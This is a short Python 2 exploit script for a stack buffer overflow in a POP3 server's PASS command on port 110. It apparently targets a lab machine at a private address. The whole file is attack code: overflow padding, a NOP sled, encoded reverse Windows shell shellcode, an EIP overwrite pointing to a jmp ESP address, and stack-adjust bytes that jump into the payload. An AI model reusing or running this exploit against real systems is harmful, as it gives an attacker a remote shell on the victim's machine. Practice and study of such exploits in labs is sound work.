#!/usr/bin/env python2
import socket

#  0x5f4a358f : "\xFF\xE4" (jmp ESP)

#offset A's in ESP dump
string = "A" * 2043

#NOP sled
string += "\x90" * 16

#Shellcode reverse windows shell
string += ("\xbf\x04\xb7\x39\x3f\xd9\xca\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x7a\x12\x03\x7a\x12\x83\xee\x4b\xdb\xca\x12\x5b\x9e"
"\x35\xea\x9c\xff\xbc\x0f\xad\x3f\xda\x44\x9e\x8f\xa8\x08\x13"
"\x7b\xfc\xb8\xa0\x09\x29\xcf\x01\xa7\x0f\xfe\x92\x94\x6c\x61"
"\x11\xe7\xa0\x41\x28\x28\xb5\x80\x6d\x55\x34\xd0\x26\x11\xeb"
"\xc4\x43\x6f\x30\x6f\x1f\x61\x30\x8c\xe8\x80\x11\x03\x62\xdb"
"\xb1\xa2\xa7\x57\xf8\xbc\xa4\x52\xb2\x37\x1e\x28\x45\x91\x6e"
"\xd1\xea\xdc\x5e\x20\xf2\x19\x58\xdb\x81\x53\x9a\x66\x92\xa0"
"\xe0\xbc\x17\x32\x42\x36\x8f\x9e\x72\x9b\x56\x55\x78\x50\x1c"
"\x31\x9d\x67\xf1\x4a\x99\xec\xf4\x9c\x2b\xb6\xd2\x38\x77\x6c"
"\x7a\x19\xdd\xc3\x83\x79\xbe\xbc\x21\xf2\x53\xa8\x5b\x59\x3c"
"\x1d\x56\x61\xbc\x09\xe1\x12\x8e\x96\x59\xbc\xa2\x5f\x44\x3b"
"\xc4\x75\x30\xd3\x3b\x76\x41\xfa\xff\x22\x11\x94\xd6\x4a\xfa"
"\x64\xd6\x9e\xad\x34\x78\x71\x0e\xe4\x38\x21\xe6\xee\xb6\x1e"
"\x16\x11\x1d\x37\xbd\xe8\xf6\xf8\xea\xd3\x85\x91\xe8\x13\x9b"
"\x3d\x64\xf5\xf1\xad\x20\xae\x6d\x57\x69\x24\x0f\x98\xa7\x41"
"\x0f\x12\x44\xb6\xde\xd3\x21\xa4\xb7\x13\x7c\x96\x1e\x2b\xaa"
"\xbe\xfd\xbe\x31\x3e\x8b\xa2\xed\x69\xdc\x15\xe4\xff\xf0\x0c"
"\x5e\x1d\x09\xc8\x99\xa5\xd6\x29\x27\x24\x9a\x16\x03\x36\x62"
"\x96\x0f\x62\x3a\xc1\xd9\xdc\xfc\xbb\xab\xb6\x56\x17\x62\x5e"
"\x2e\x5b\xb5\x18\x2f\xb6\x43\xc4\x9e\x6f\x12\xfb\x2f\xf8\x92"
"\x84\x4d\x98\x5d\x5f\xd6\xb8\xbf\x75\x23\x51\x66\x1c\x8e\x3c"
"\x99\xcb\xcd\x38\x1a\xf9\xad\xbe\x02\x88\xa8\xfb\x84\x61\xc1"
"\x94\x60\x85\x76\x94\xa0")

#Padding
string += "A" * (2606-len(string))

#  0x5f4a358f 
#String for EIP position that points to command "jmp esp" ("\xFF\xE4"). 
string += "\x8F\x35\x4A\x5F"

#NOP sled
string += "\x90" * 10

# Code to add esp +2496, jmp esp (makes jump to shellcode)
string +=("\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\x83\xC4\x68\xFF\xE4")

#Padding
string += "C" * 20


print "Fuzzing PASS with %s bytes" % len(string)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.33.132',110))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS ' + string + '\r\n')
s.send('QUIT\r\n')
s.close()
